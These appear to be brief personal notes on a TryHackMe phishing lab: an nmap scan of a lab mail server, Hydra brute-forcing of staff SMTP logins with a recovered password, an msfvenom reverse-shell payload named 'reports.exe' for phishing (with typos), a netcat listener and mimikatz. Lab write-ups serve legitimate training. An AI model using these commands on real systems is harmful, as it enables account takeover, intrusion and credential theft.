
#CTF #Phishing 
https://tryhackme.com/room/yougotmail

```
https://brownbrik.co
10.10.153.179

# nmap 

25/tcp    open  smtp
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 

110/tcp   open  pop3
|_pop3-capabilities: UIDL USER TOP

135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
|_imap-capabilities: NAMESPACE OK CAPABILITY SORT ACL QUOTA completed IDLE RIGHTS=texkA0001 IMAP4rev1 CHILDREN IMAP4

445/tcp   open  microsoft-ds

587/tcp   open  submission
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 

3389/tcp  open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: BRICK-MAIL
|   NetBIOS_Domain_Name: BRICK-MAIL
|   NetBIOS_Computer_Name: BRICK-MAIL
|   DNS_Domain_Name: BRICK-MAIL
|   DNS_Computer_Name: BRICK-MAIL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-10T18:18:14+00:00
| ssl-cert: Subject: commonName=BRICK-MAIL
| Not valid before: 2025-02-09T18:03:19
|_Not valid after:  2025-08-11T18:03:19
|_ssl-date: 2025-02-10T18:18:14+00:00; 0s from scanner time.

5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49672/tcp open  unknown
49674/tcp open  unknown
MAC Address: 02:9D:44:8C:C8:05 (Unknown)

Host script results:
|_nbstat: NetBIOS name: BRICK-MAIL, NetBIOS user: <unknown>, NetBIOS MAC: 02:9d:44:8c:c8:05 (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-10T18:18:14
|_  start_date: N/A

```

```
Omar Aurelius      oaurelius@brownbrick.co 
Titus Chikondi     tchikondi@brownbrick.co
Winifred Rohit     wrohit@brownbrick.co
Pontos Cathrine    pcathrine@brownbrick.co
Laird Hedvig       lhedvig@brownbrick.co
Filimena Stamatis  fstamatis@brownbrick.co

-- put in file email.txt
oaurelius@brownbrick.co 
tchikondi@brownbrick.co
wrohit@brownbrick.co
pcathrine@brownbrick.co
lhedvig@brownbrick.co
fstamatis@brownbrick.co

hydra -L emails.txt -P /usr/share/wordlists/rockyou.txt smtp://10.10.153.179

have lower and uppercase for passwords
hydra -L emails.txt -P brikpasswords.txt smtp://10.10.153.179

lhedvig@brownbrick.co : bricks

thunderbird email setup with creds

msfvenom -p windows/x84/shell_reverse_tcp LHOST=10.10.x.x LPORT=1234 -f -exe -o reports.exe

rlwrap nc -nlvp 1234

mimikatz

```